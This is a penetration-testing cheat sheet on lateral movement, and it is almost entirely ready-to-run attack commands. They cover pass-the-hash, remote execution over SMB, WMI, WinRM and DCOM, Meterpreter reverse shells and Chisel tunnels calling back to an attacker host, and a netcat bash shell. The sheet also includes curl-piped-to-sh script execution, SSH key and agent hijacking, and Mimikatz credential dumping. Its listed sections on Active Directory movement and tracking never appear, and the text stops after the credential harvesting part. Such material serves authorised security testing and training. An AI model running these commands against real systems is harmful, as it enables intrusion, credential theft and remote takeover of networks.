# Lateral Movement

## 🎯 Goal

Use credentials, hashes, and tickets from one compromised host to gain **access to additional systems** and deepen control across the network.

---
## Table of Contents

1. [Strategy and Attack Graphs](#1-strategy-and-attack-graphs)
2. [Windows Lateral Movement](#2-windows-lateral-movement)
3. [Linux Lateral Movement](#3-linux-lateral-movement)
4. [Credential Reuse and Password Spraying](#4-credential-reuse-and-password-spraying)
5. [AD-Specific Movement](#5-ad-specific-lateral-movement)
6. [Progress Tracking and Documentation](#6-progress-tracking-and-documentation)

---

## 📋 Phase Checklist

### Strategy & Visualization

- [ ] **Visualize Nodes & Edges** → [1.1](#11-network-visualization-concept)
- [ ] **Init Tracking Table** → [1.2](#12-centralized-movement-tracking-table)
- [ ] **Identify High-Value Targets** → [1.2](#12-centralized-movement-tracking-table)

### Windows Movement
- [ ] **PSExec/SMB Exec** → [2.1](#21-psexec-style-execution)
- [ ] **WMI Lateral Move** → [2.2](#22-wmi-based-movement)
- [ ] **WinRM/PS Remoting** → [2.3](#23-winrm-and-powershell-remoting)
- [ ] **RDP Access** → [2.4](#24-rdp-remote-desktop)
- [ ] **Service Execution** → [2.5](#25-service-based-execution)

### Linux Movement
- [ ] **SSH Access/Keys** → [3.1](#31-ssh-access)
- [ ] **Proxychains Pivot** → [3.2](#32-proxychains-pivoting)
- [ ] **Harvest SSH Keys** → [3.3](#33-ssh-key-harvesting)
- [ ] **SSH Agent Hijack** → [3.3](#33-ssh-key-harvesting)

### Credential Ops
- [ ] **Inventory Creds** → [4.1](#41-credential-inventory-management)
- [ ] **SMB/WinRM Spray** → [4.2](#42-targeted-password-spraying)
- [ ] **SSH/RDP Spray** → [4.2](#42-targeted-password-spraying)
- [ ] **Check Safety/Lockout** → [4.3](#43-spraying-safety-measures)

### AD-Specific Movement
- [ ] **Pass-the-Hash (PtH)** → [5.1](#51-pass-the-hash-pth-strategy)
- [ ] **Pass-the-Ticket (PtT)** → [5.2](#52-pass-the-ticket-ptt-movement)
- [ ] **Golden/Silver Ticket** → [5.2](#52-pass-the-ticket-ptt-movement)
- [ ] **Hunt Admin Sessions** → [5.3](#53-admin-session-exploitation)
- [ ] **Dump LSASS/Secrets** → [5.3](#53-admin-session-exploitation)

### Attack Path Analysis
- [ ] **Run BloodHound** → [5.4](#54-bloodhound-informed-movement)
- [ ] **Map Shortest Paths** → [5.4](#54-bloodhound-informed-movement)
- [ ] **Target ACLs/GPOs** → [5.4](#54-bloodhound-informed-movement)

### 7. Tracking & Documentation
- [ ] **Update Dashboard** → [6.1](#61-centralized-movement-dashboard)
- [ ] **Prioritize Targets** → [6.2](#62-next-target-prioritization)
- [ ] **Map Compromise Path** → [6.2](#62-next-target-prioritization)

---

## 1 Strategy and Attack Graphs

### 1.1 Network Visualization Concept

**Nodes & Edges Approach:**

- **🖥️ Nodes**: Machines (workstations, servers, DCs, network devices)
- **🔗 Edges**: Connection methods (SMB, WinRM, RDP, SSH, WMI)
- **🏷️ Labels**: Access levels (local admin, user, domain admin)

### 1.2 Centralized Movement Tracking Table

**Movement Tracking Template:**

```markdown
## 🔄 Lateral Movement Tracker

| Host | IP | Method | Credentials Used | Access Level | Notes |
|------|----|--------|------------------|-------------|-------|
| SRV-WEB01 | 10.11.1.5 | WinRM | domain\webadmin / Pass123 | Local Admin | Web server with DB connections |
| WS-USER02 | 10.11.1.15 | SMB PtH | domain\user02 / NTLM_HASH | User | Found RDP credentials in memory |
| DC01 | 10.11.1.20 | DCSync | domain\administrator / Hash | Domain Admin | Golden ticket created |
| SRV-SQL01 | 10.11.1.25 | WMI | domain\sqlservice / Pass456 | Local Admin | Service account reuse |
```

**Priority Targeting:**

1. 🎯 **Domain Controllers** - Highest value targets
2. 🏰 **Infrastructure Servers** - SQL, Exchange, File Servers
3. 💼 **Workstations with Admin Sessions** - Credential harvesting
4. 🔧 **Jump Servers** - Administrative access points
5. 📊 **Database Servers** - Data and credential storage

---

## 2 Windows Lateral Movement

### 2.1 PSExec-Style Execution

**Impacket PSExec (Linux)**

```bash
# Basic PSExec with password
impacket-psexec domain.local/user:Password123@10.11.1.30
psexec.py domain.local/user:Password123@10.11.1.30

# Pass-the-Hash
impacket-psexec domain.local/user@10.11.1.30 -hashes :NTLM_HASH
psexec.py domain.local/user@10.11.1.30 -hashes :NTLM_HASH

# With specific command
impacket-psexec domain.local/<USER>:<PASSWORD>@10.11.1.30 -c "whoami /all"
psexec.py domain.local/user:Password123@10.11.1.30 "whoami /all"

# Debug mode for troubleshooting
impacket-psexec domain.local/user:Password123@10.11.1.30 -debug
psexec.py domain.local/user:Password123@10.11.1.30 -debug

# With local authentication
impacket-psexec ./administrator:Password123@10.11.1.30

# Using full hash format (LM:NTLM)
impacket-psexec domain.local/user@10.11.1.30 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

**CrackMapExec for Mass Execution**

```bash
# Scan and execute on multiple hosts
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' -x "whoami"
cme smb 10.11.1.0/24 -u user -p 'Password123' -x "whoami"

# Pass-the-Hash across subnet
crackmapexec smb 10.11.1.0/24 -u user -H NTLM_HASH -x "systeminfo"
cme smb 10.11.1.0/24 -u user -H NTLM_HASH -x "systeminfo"

# Execute PowerShell script
crackmapexec smb 10.11.1.30 -u user -p 'Password123' -X "Get-Process"
cme smb 10.11.1.30 -u user -p 'Password123' -X '$PSVersionTable'

# Dump SAM from multiple hosts
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --sam
cme smb 10.11.1.0/24 -u user -p 'Password123' --sam

# Check local admin access
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --local-auth

# Using multiple usernames/passwords from files
crackmapexec smb 10.11.1.0/24 -u users.txt -p passwords.txt --continue-on-success

# Execute command and save output
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' -x "ipconfig" --no-output
```

**Metasploit PSExec**

```bash
# Module for PSExec
use exploit/windows/smb/psexec
set RHOSTS 10.11.1.30
set SMBUser user
set SMBPass Password123
set SMBDomain domain.local
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
exploit

# PSExec with Pass-the-Hash
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
set RHOSTS 10.11.1.30
exploit
```

### 2.2 WMI-Based Movement

**Impacket WMIExec**

```bash
# WMI execution with credentials
impacket-wmiexec domain.local/user:Password123@10.11.1.30
wmiexec.py domain.local/user:Password123@10.11.1.30

# Pass-the-Hash via WMI
impacket-wmiexec domain.local/user@10.11.1.30 -hashes :NTLM_HASH
wmiexec.py domain.local/user@10.11.1.30 -hashes :NTLM_HASH

# Interactive shell
impacket-wmiexec domain.local/user:Password123@10.11.1.30
wmiexec.py domain.local/user:Password123@10.11.1.30

# Single command execution
impacket-wmiexec domain.local/user:Password123@10.11.1.30 "whoami && ipconfig"
wmiexec.py domain.local/user:Password123@10.11.1.30 "whoami && hostname"

# With local authentication
impacket-wmiexec ./administrator:Password123@10.11.1.30

# Silent mode (no output to stdout)
wmiexec.py domain.local/user:Password123@10.11.1.30 -silentcommand
```

**PowerShell WMI (From Windows)**

```powershell
# Check WMI availability
Test-WSMan 10.11.1.30

# Execute command via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName 10.11.1.30

# Get process list remotely
Get-WmiObject -Class Win32_Process -ComputerName 10.11.1.30

# With credentials
$Username = 'domain\user'
$Password = 'Password123'
$SecPass = ConvertTo-SecureString $Password -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($Username, $SecPass)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName 10.11.1.30 -Credential $Cred

# Create persistent WMI connection
$Session = New-CimSession -ComputerName 10.11.1.30 -Credential (Get-Credential)
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='whoami'}

# Query system information
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 10.11.1.30 | Select-Object Caption, Version, BuildNumber

# Get installed software
Get-WmiObject -Class Win32_Product -ComputerName 10.11.1.30
```

**CrackMapExec WMI**

```bash
# WMI execution
crackmapexec wmi 10.11.1.0/24 -u user -p 'Password123' -x "whoami"
cme wmi 10.11.1.0/24 -u user -p 'Password123' -x "hostname"

# Pass-the-Hash via WMI
crackmapexec wmi 10.11.1.30 -u user -H NTLM_HASH -x "ipconfig"
```

### 2.3 WinRM and PowerShell Remoting

**Service Detection**

```bash
# Scan for WinRM ports
nmap -p 5985,5986 10.11.1.0/24
nmap -p 5985,5986 -sV 10.11.1.0/24

# Check WinRM status remotely
crackmapexec winrm 10.11.1.0/24 -u user -p 'Password123'
cme winrm 10.11.1.0/24 -u user -p 'Password123'

# Enumerate WinRM with Metasploit
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS 10.11.1.0/24
run
```

**Evil-WinRM (Linux)**

```bash
# Basic WinRM connection
evil-winrm -i 10.11.1.30 -u user -p 'Password123'

# Pass-the-Hash
evil-winrm -i 10.11.1.30 -u user -H NTLM_HASH

# With domain specification
evil-winrm -i 10.11.1.30 -u user -p 'Password123' -d domain.local

# Upload files during session
evil-winrm -i 10.11.1.30 -u user -p 'Password123' -s /path/to/scripts -e /path/to/exes

# SSL connection
evil-winrm -i 10.11.1.30 -u user -p 'Password123' -S -P 5986

# Within Evil-WinRM session:
# Upload file
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\temp\file.exe

# Download file
*Evil-WinRM* PS C:\> download C:\temp\file.txt /local/path/file.txt

# Load PowerShell script
*Evil-WinRM* PS C:\> Invoke-Binary /path/to/binary.exe

# Menu
*Evil-WinRM* PS C:\> menu
```

**PowerShell Remoting (From Windows)**

```powershell
# Test connectivity
Test-WSMan 10.11.1.30
Test-WSMan -ComputerName 10.11.1.30 -Authentication Default

# Enter PSSession
Enter-PSSession -ComputerName 10.11.1.30 -Credential (Get-Credential)

# Execute remote command
Invoke-Command -ComputerName 10.11.1.30 -ScriptBlock { whoami; systeminfo } -Credential (Get-Credential)

# Create persistent session
$Session = New-PSSession -ComputerName 10.11.1.30 -Credential (Get-Credential)
Invoke-Command -Session $Session -ScriptBlock { whoami }

# Multiple computers
Invoke-Command -ComputerName 10.11.1.30,10.11.1.31,10.11.1.32 -ScriptBlock { Get-Service } -Credential (Get-Credential)

# Execute script file
Invoke-Command -ComputerName 10.11.1.30 -FilePath C:\scripts\script.ps1 -Credential (Get-Credential)

# Copy item to remote session
Copy-Item -Path C:\local\file.txt -Destination C:\remote\ -ToSession $Session

# Copy item from remote session
Copy-Item -Path C:\remote\file.txt -Destination C:\local\ -FromSession $Session

# Enable PSRemoting (if you have access)
Enable-PSRemoting -Force

# Configure TrustedHosts (if needed)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.11.1.30" -Force
```

**CrackMapExec WinRM**

```bash
# Execute commands via WinRM
crackmapexec winrm 10.11.1.0/24 -u user -p 'Password123' -x "whoami"
cme winrm 10.11.1.0/24 -u user -p 'Password123' -x "hostname"

# Pass-the-Hash via WinRM
crackmapexec winrm 10.11.1.30 -u user -H NTLM_HASH -x "ipconfig"

# Execute PowerShell command
crackmapexec winrm 10.11.1.30 -u user -p 'Password123' -X '$env:computername'
```

### 2.4 RDP (Remote Desktop)

**Service Detection**

```bash
# Scan for RDP
nmap -p 3389 10.11.1.0/24
nmap -p 3389 -sV --script rdp-enum-encryption 10.11.1.0/24

# Check RDP security
rdp-sec-check 10.11.1.30

# Metasploit RDP scanner
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 10.11.1.0/24
run

# Check for BlueKeep vulnerability
nmap -p 3389 --script rdp-vuln-ms12-020 10.11.1.0/24
```

**xfreerdp (Linux)**

```bash
# Basic RDP connection
xfreerdp /u:domain\\user /p:Password123 /v:10.11.1.30 /dynamic-resolution /cert:ignore

# Alternative syntax
xfreerdp /u:user /p:Password123 /d:domain.local /v:10.11.1.30 /cert:ignore

# Pass-the-Hash (if supported - requires freerdp 2.0+)
xfreerdp /u:domain\\user /pth:NTLM_HASH /v:10.11.1.30 /dynamic-resolution /cert:ignore

# With specific domain
xfreerdp /u:user /d:domain.local /p:Password123 /v:10.11.1.30 /cert:ignore

# Multiple monitors and drive sharing
xfreerdp /u:user /p:Password123 /v:10.11.1.30 +home-drive /multimon

# Full screen mode
xfreerdp /u:user /p:Password123 /v:10.11.1.30 /f /cert:ignore

# Share local directory
xfreerdp /u:user /p:Password123 /v:10.11.1.30 /drive:share,/tmp/share /cert:ignore

# Custom resolution
xfreerdp /u:user /p:Password123 /v:10.11.1.30 /size:1920x1080 /cert:ignore

# Clipboard sharing
xfreerdp /u:user /p:Password123 /v:10.11.1.30 +clipboard /cert:ignore

# Network level authentication
xfreerdp /u:user /p:Password123 /v:10.11.1.30 /sec:nla /cert:ignore
```

**rdesktop (Alternative)**

```bash
# Basic connection
rdesktop -u user -p Password123 -d domain 10.11.1.30

# Full screen
rdesktop -u user -p Password123 -d domain -f 10.11.1.30

# Custom geometry
rdesktop -u user -p Password123 -g 1920x1080 10.11.1.30

# Sound redirection
rdesktop -u user -p Password123 -r sound:local 10.11.1.30

# Share directory
rdesktop -u user -p Password123 -r disk:share=/tmp/share 10.11.1.30
```

**RDP Session Management**

```powershell
# Check RDP sessions remotely
qwinsta /server:10.11.1.30
query user /server:10.11.1.30

# Log off specific session
rwinsta 1 /server:10.11.1.30
logoff 1 /server:10.11.1.30

# Enable RDP remotely (requires admin access)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Via registry
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Enable RDP firewall rule
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Check RDP status
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
```

**CrackMapExec RDP**

```bash
# Check RDP access
crackmapexec rdp 10.11.1.0/24 -u user -p 'Password123'
cme rdp 10.11.1.0/24 -u user -p 'Password123'

# Screenshot capability
crackmapexec rdp 10.11.1.30 -u user -p 'Password123' --screenshot
```

### 2.5 Service-Based Execution

**SC Manager Methods**

```powershell
# Create service remotely
sc \\10.11.1.30 create "TempService" binPath= "cmd.exe /c C:\temp\payload.exe"
sc \\10.11.1.30 start "TempService"
sc \\10.11.1.30 delete "TempService"

# Query service status
sc \\10.11.1.30 query "TempService"

# Create service with specific user
sc \\10.11.1.30 create "TempService" binPath= "C:\temp\payload.exe" obj= "NT AUTHORITY\SYSTEM"

# Using WMI for service creation
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList @($null,$null,"TempService","C:\temp\payload.exe",16,$null,$null,$null,$null,$null,$null) -ComputerName 10.11.1.30

# PowerShell service creation
New-Service -Name "TempService" -BinaryPathName "C:\temp\payload.exe" -ComputerName 10.11.1.30 -StartupType Manual
Start-Service -Name "TempService" -ComputerName 10.11.1.30
Remove-Service -Name "TempService" -ComputerName 10.11.1.30
```

**Impacket Services**

```bash
# Impacket services execution
impacket-services domain.local/user:Password123@10.11.1.30 list
impacket-services domain.local/user:Password123@10.11.1.30 start ServiceName
impacket-services domain.local/user:Password123@10.11.1.30 stop ServiceName

# Create and start service
impacket-services domain.local/user:Password123@10.11.1.30 create -name TempService -display "Temp Service" -path "C:\temp\payload.exe"
impacket-services domain.local/user:Password123@10.11.1.30 start TempService
```

**SchTasks for Execution**

```powershell
# Create scheduled task remotely
schtasks /create /s 10.11.1.30 /tn "TempTask" /tr "C:\temp\payload.exe" /sc once /st 00:00 /ru "SYSTEM"

# Run task immediately
schtasks /run /s 10.11.1.30 /tn "TempTask"

# Delete task
schtasks /delete /s 10.11.1.30 /tn "TempTask" /f

# Create task with specific user
schtasks /create /s 10.11.1.30 /u domain\user /p Password123 /tn "TempTask" /tr "C:\temp\payload.exe" /sc once /st 00:00

# List tasks
schtasks /query /s 10.11.1.30 /fo LIST /v

# Create task that runs at logon
schtasks /create /s 10.11.1.30 /tn "StartupTask" /tr "C:\temp\payload.exe" /sc onlogon /ru "SYSTEM"

# Run with highest privileges
schtasks /create /s 10.11.1.30 /tn "PrivTask" /tr "C:\temp\payload.exe" /sc once /st 00:00 /rl HIGHEST
```

**Impacket AtExec**

```bash
# Execute command via Task Scheduler
impacket-atexec domain.local/user:Password123@10.11.1.30 "whoami"
atexec.py domain.local/user:Password123@10.11.1.30 "whoami"

# Pass-the-Hash
impacket-atexec domain.local/user@10.11.1.30 -hashes :NTLM_HASH "systeminfo"
atexec.py domain.local/user@10.11.1.30 -hashes :NTLM_HASH "systeminfo"

# Execute command and retrieve output
atexec.py domain.local/user:Password123@10.11.1.30 "powershell -c Get-Process"
```

**DCOM Execution**

```powershell
# MMC20.Application execution
$com = [Type]::GetTypeFromProgID("MMC20.Application","10.11.1.30")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")

# ShellWindows DCOM
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.11.1.30")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)

# ShellBrowserWindow DCOM
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.11.1.30")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)
```

**Impacket DcomExec**

```bash
# DCOM execution
impacket-dcomexec domain.local/user:Password123@10.11.1.30 "whoami"
dcomexec.py domain.local/user:Password123@10.11.1.30 "whoami"

# Pass-the-Hash
impacket-dcomexec domain.local/user@10.11.1.30 -hashes :NTLM_HASH "systeminfo"

# Specify DCOM object
dcomexec.py -object MMC20 domain.local/user:Password123@10.11.1.30
```

---

## 3 Linux Lateral Movement

### 3.1 SSH Access

**Basic SSH Connections**

```bash
# Password authentication
ssh user@10.11.2.10

# Key-based authentication
ssh -i /path/to/private_key user@10.11.2.10

# Specific port
ssh -p 2222 user@10.11.2.10

# With command execution
ssh user@10.11.2.10 "whoami; cat /etc/passwd"

# Verbose mode for troubleshooting
ssh -v user@10.11.2.10
ssh -vv user@10.11.2.10
ssh -vvv user@10.11.2.10

# Disable host key checking (pentesting only)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@10.11.2.10

# X11 forwarding
ssh -X user@10.11.2.10

# Compression
ssh -C user@10.11.2.10

# Keep alive
ssh -o ServerAliveInterval=60 user@10.11.2.10
```

**SSH Key Management**

```bash
# Generate new key pair
ssh-keygen -t rsa -b 4096 -f /tmp/lateral_key
ssh-keygen -t ed25519 -f /tmp/lateral_key

# Generate with no passphrase
ssh-keygen -t rsa -b 4096 -f /tmp/lateral_key -N ""

# Copy public key to target
ssh-copy-id -i /tmp/lateral_key.pub user@10.11.2.10

# Manual key copy
cat /tmp/lateral_key.pub | ssh user@10.11.2.10 "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Use specific key
ssh -i /tmp/lateral_key user@10.11.2.10

# Change key permissions (if needed)
chmod 600 /tmp/lateral_key
chmod 644 /tmp/lateral_key.pub

# Convert SSH key formats
ssh-keygen -p -m PEM -f /tmp/lateral_key
```

**SSH Config for Efficiency**

```bash
# ~/.ssh/config
Host target-server
    HostName 10.11.2.10
    User privileged-user
    Port 22
    IdentityFile ~/.ssh/lateral_key
    ServerAliveInterval 60
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    
Host jump-box
    HostName 10.11.1.100
    User jumpuser
    IdentityFile ~/.ssh/jump_key
    
Host internal-server
    HostName 10.11.3.50
    User root
    ProxyJump jump-box
    IdentityFile ~/.ssh/internal_key

# Usage
ssh target-server
ssh internal-server
```

**SSH Tunneling**

```bash
# Local port forwarding
ssh -L 8080:localhost:80 user@10.11.2.10

# Remote port forwarding
ssh -R 8080:localhost:80 user@10.11.2.10

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@10.11.2.10

# Bind to all interfaces
ssh -D 0.0.0.0:1080 user@10.11.2.10

# Multiple port forwards
ssh -L 8080:localhost:80 -L 3306:localhost:3306 user@10.11.2.10

# Keep tunnel alive in background
ssh -f -N -L 8080:localhost:80 user@10.11.2.10
```

### 3.2 Proxychains Pivoting

**SSH Dynamic Forwarding**

```bash
# Create SOCKS proxy
ssh -D 1080 user@10.11.2.10

# Background mode
ssh -f -N -D 1080 user@10.11.2.10

# Multiple hops
ssh -J jumpuser@10.11.1.100 targetuser@10.11.2.10

# Multiple jump hosts
ssh -J jumpuser1@10.11.1.100,jumpuser2@10.11.2.50 targetuser@10.11.3.10

# ProxyJump with dynamic forwarding
ssh -J jumpuser@10.11.1.100 -D 1080 targetuser@10.11.2.10
```

**Proxychains Configuration**

```bash
# /etc/proxychains.conf or /etc/proxychains4.conf
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks4  127.0.0.1 1080

# For SOCKS5
socks5  127.0.0.1 1080

# Chain multiple proxies
socks4  127.0.0.1 1080
socks5  127.0.0.1 1081
```

**Proxychains Usage**

```bash
# Network scanning through proxy
proxychains nmap -sT -Pn 10.11.3.0/24
proxychains4 nmap -sT -Pn -p 22,80,443 10.11.3.0/24

# SMB enumeration through proxy
proxychains smbclient -L //10.11.3.20 -N
proxychains enum4linux -a 10.11.3.20

# Web application testing
proxychains curl http://10.11.3.50/admin/
proxychains wget http://10.11.3.50/backup.zip

# Database connections
proxychains mysql -h 10.11.3.60 -u admin -p
proxychains psql -h 10.11.3.60 -U postgres

# Metasploit through proxy
proxychains msfconsole
proxychains msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o payload.elf

# SSH through proxy
proxychains ssh user@10.11.3.100

# FTP through proxy
proxychains ftp 10.11.3.80

# RDP through proxy
proxychains xfreerdp /u:user /p:password /v:10.11.3.30
```

**SSH Port Forwarding Chains**

```bash
# First hop
ssh -L 2222:10.11.2.10:22 user@10.11.1.100

# Second hop through first
ssh -p 2222 -L 3333:10.11.3.50:22 user@localhost

# Access final target
ssh -p 3333 user@localhost

# All-in-one with ProxyCommand
ssh -o ProxyCommand="ssh -W %h:%p user@10.11.1.100" user@10.11.2.10
```

**Chisel for Pivoting**

```bash
# On your attack machine (Chisel server)
./chisel server -p 8000 --reverse

# On compromised host (Chisel client)
./chisel client 10.10.14.5:8000 R:1080:socks

# Use with proxychains
proxychains nmap -sT 10.11.3.0/24

# Forward specific port
./chisel client 10.10.14.5:8000 R:8080:10.11.3.50:80

# Multiple forwards
./chisel client 10.10.14.5:8000 R:8080:10.11.3.50:80 R:3389:10.11.3.60:3389
```

**Metasploit Pivoting**

```bash
# Add route through meterpreter session
route add 10.11.3.0 255.255.255.0 1

# Use auxiliary modules through pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.11.3.0/24
set PORTS 22,80,443
run

# Socks proxy through meterpreter
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j

# Then configure proxychains and use it
proxychains nmap -sT 10.11.3.0/24
```

### 3.3 SSH Key Harvesting

**Common Key Locations**

```bash
# Search for SSH keys
find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null

# Check SSH directories
ls -la ~/.ssh/
ls -la /home/*/.ssh/
ls -la /root/.ssh/

# Look for authorized_keys
find / -name "authorized_keys" 2>/dev/null

# Search for private keys with specific permissions
find / -name "id_*" -o -name "*.pem" 2>/dev/null | xargs ls -la

# Search in common backup locations
find / -path "*backup*" -name "id_*" 2>/dev/null
find / -path "*bak*" -name "*.pem" 2>/dev/null

# Check for keys in unusual locations
find /var /opt /usr/local -name "id_*" -o -name "*.pem" 2>/dev/null

# Search for encrypted keys
grep -r "ENCRYPTED" /home/*/.ssh/ 2>/dev/null
grep -r "ENCRYPTED" /root/.ssh/ 2>/dev/null

# Look for SSH config files
find / -name "ssh_config" -o -name "sshd_config" 2>/dev/null

# Check for known_hosts (may reveal other targets)
find / -name "known_hosts" 2>/dev/null
cat ~/.ssh/known_hosts
```

**SSH Key Analysis**

```bash
# Check key type
ssh-keygen -l -f /path/to/key

# Get fingerprint
ssh-keygen -lf /path/to/key

# Test key without logging in
ssh -i /path/to/key -o BatchMode=yes -o ConnectTimeout=5 user@10.11.2.10 echo "Success"

# Extract public key from private key
ssh-keygen -y -f /path/to/private_key > public_key.pub

# Check if key is encrypted
head -n 2 /path/to/private_key | grep "ENCRYPTED"

# Crack encrypted SSH key
ssh2john /path/to/encrypted_key > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```

**SSH Agent Hijacking**

```bash
# Check for running SSH agent
echo "$SSH_AUTH_SOCK"
env | grep SSH

# List loaded keys
ssh-add -l

# Find SSH agent sockets
find /tmp -name "agent.*" 2>/dev/null
ps aux | grep ssh-agent

# Hijack SSH agent (if you have access to the socket)
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.12345
ssh-add -l

# Use agent for forwarding
ssh -A user@10.11.2.10

# Dump keys from agent (with appropriate access)
ps aux | grep ssh-agent
sudo gdb -p [PID]
call (char*)malloc(1000000)
dump memory /tmp/agent_dump 0x[ADDRESS] 0x[ADDRESS]+1000000
```

**Automated SSH Key Hunting**

```bash
# Script to find and test SSH keys
#!/bin/bash
for key in $(find / -name "id_*" -o -name "*.pem" 2>/dev/null); do
    echo "Testing key: $key"
    chmod 600 "$key" 2>/dev/null
    for user in root admin user ubuntu centos; do
        for host in 10.11.2.10 10.11.2.20 10.11.2.30; do
            timeout 5 ssh -i "$key" -o StrictHostKeyChecking=no -o BatchMode=yes "$user@$host" "echo '[+] Success: $user@$host with $key'" 2>/dev/null
        done
    done
done

# LinPEAS SSH key enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual extraction of SSH configuration
cat /etc/ssh/sshd_config | grep -v "^#"
```

### 3.4 Alternative Linux Movement

**RSH/Rexec (Legacy)**

```bash
# If enabled (rare in modern systems)
rsh -l user 10.11.2.10 whoami
rexec -l user 10.11.2.10 whoami

# Check if rsh/rexec are available
which rsh rexec
netstat -ant | grep 512
netstat -ant | grep 513
netstat -ant | grep 514

# Scan for rsh services
nmap -p 512,513,514 10.11.2.0/24
```

**SSH Reverse Shells**

```bash
# Create reverse shell via SSH
ssh -R 8888:127.0.0.1:9998 user@10.11.2.10

# Remote port forwarding for access
ssh -R 3389:10.11.3.30:3389 user@10.11.2.10

# Reverse SOCKS proxy
ssh -R 1080 user@10.11.2.10

# Persistent reverse tunnel
autossh -M 0 -R 8888:localhost:22 user@10.11.2.10 -f -N

# Create reverse tunnel and execute commands
ssh -R 8888:localhost:22 user@10.11.2.10 "while true; do nc -l -p 9999 -e /bin/bash; done"
```

**Ansible for Lateral Movement**

```bash
# If Ansible is installed on compromised host
ansible all -i "10.11.2.10,10.11.2.20," -m shell -a "whoami" --user=root --ask-pass

# Using Ansible playbook
cat > lateral.yml << EOF
---
- hosts: all
  tasks:
    - name: Execute command
      shell: whoami
EOF

ansible-playbook -i "10.11.2.10," lateral.yml --user=root --ask-pass

# Check Ansible inventory files
find / -name "hosts" -o -name "inventory" 2>/dev/null
cat /etc/ansible/hosts
```

**Fabric (Python) for Automation**

```python
# If Fabric is available
from fabric import Connection

c = Connection('user@10.11.2.10')
result = c.run('whoami', hide=True)
print(result.stdout.strip())
```

**Screen/Tmux Session Hijacking**

```bash
# List screen sessions
screen -ls

# Attach to screen session (if permissions allow)
screen -x [session_id]

# List tmux sessions
tmux ls

# Attach to tmux session
tmux attach -t [session_name]

# Find screen sockets
find /var/run/screen -type d 2>/dev/null
ls -la /var/run/screen/S-*/

# Find tmux sockets
find /tmp/tmux-* 2>/dev/null
```

---

## 4 Credential Reuse and Password Spraying

### 4.1 Credential Inventory Management

**Credential Tracking Template:**

```markdown
## 🔑 Credential Inventory

| Type | Username | Password/Hash | Source | Reuse Tested | Success Rate | Notes |
|------|----------|---------------|--------|-------------|-------------|-------|
| Domain | domain\user1 | Password123 | LSASS Dump | 5/10 hosts | 50% | Local admin on web servers |
| Local | admin | Summer2024! | Config File | 2/8 hosts | 25% | Workstations only |
| Service | sqlservice | NTLM_HASH | Kerberoasting | 3/3 SQL servers | 100% | High value account |
| SSH | root | SSH_KEY | File System | 8/15 hosts | 53% | Linux infrastructure |
| Database | sa | DbPass2024! | Config File | 2/2 SQL | 100% | All SQL servers |
```

**Credential Extraction Locations**

```bash
# Windows credential sources
- LSASS memory dumps
- SAM/SYSTEM registry hives
- Credential Manager
- Registry (saved credentials)
- Configuration files (web.config, unattend.xml)
- PowerShell history
- Stored RDP credentials
- Browser saved passwords
- KeePass/password manager databases
- GPP passwords (legacy)
- NTDS.dit (Domain Controllers)

# Linux credential sources
- /etc/shadow
- SSH private keys
- Bash history (.bash_history)
- Configuration files
- Database configuration files
- Environment variables
- Memory dumps
- Application logs
- Docker secrets/configs
```

**Automated Credential Harvesting**

```bash
# Windows - Mimikatz
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets
mimikatz # lsadump::sam
mimikatz # vault::cred

# Windows - LaZagne
lazagne.exe all

